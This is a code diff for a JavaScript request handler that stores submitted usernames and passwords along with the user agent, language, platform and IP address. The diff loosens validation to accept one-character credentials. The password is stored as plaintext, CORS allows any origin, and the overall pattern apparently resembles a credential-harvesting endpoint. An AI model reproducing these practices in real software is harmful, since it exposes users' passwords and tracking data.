@@ -109,7 +109,7 @@ async function storeUserData(userData) {
     }
 }
 
-export default async function handler(req, res) {
+async function handler(req, res) {
     // Set CORS headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -139,36 +139,42 @@ export default async function handler(req, res) {
             });
         }
         
+        // Set default values for optional fields
+        const safeTimestamp = timestamp || new Date().toISOString();
+        const safeUserAgent = userAgent || 'Unknown';
+        const safeLanguage = language || 'en-US';
+        const safePlatform = platform || 'Unknown';
+        
         // Validate input lengths
-        if (username.length < 3 || username.length > 30) {
+        if (username.length < 1 || username.length > 30) {
             return res.status(400).json({
                 success: false,
-                message: 'Username must be between 3 and 30 characters'
+                message: 'Username must be between 1 and 30 characters'
             });
         }
         
-        if (password.length < 6 || password.length > 100) {
+        if (password.length < 1 || password.length > 100) {
             return res.status(400).json({
                 success: false,
-                message: 'Password must be between 6 and 100 characters'
+                message: 'Password must be between 1 and 100 characters'
             });
         }
         
         // Get client IP address
-        const ipAddress = req.headers['x-forwarded-for'] || 
-                         req.headers['x-real-ip'] || 
-                         req.connection.remoteAddress || 
-                         req.socket.remoteAddress ||
+        const ipAddress = (req.headers && req.headers['x-forwarded-for']) || 
+                         (req.headers && req.headers['x-real-ip']) || 
+                         (req.connection && req.connection.remoteAddress) || 
+                         (req.socket && req.socket.remoteAddress) ||
                          'Unknown';
         
         // Prepare user data
         const userData = {
             username: username.trim(),
             password: password,
-            timestamp: timestamp || new Date().toISOString(),
-            userAgent: userAgent || 'Unknown',
-            language: language || 'Unknown',
-            platform: platform || 'Unknown',
+            timestamp: safeTimestamp,
+            userAgent: safeUserAgent,
+            language: safeLanguage,
+            platform: safePlatform,
             ipAddress: ipAddress
         };
         
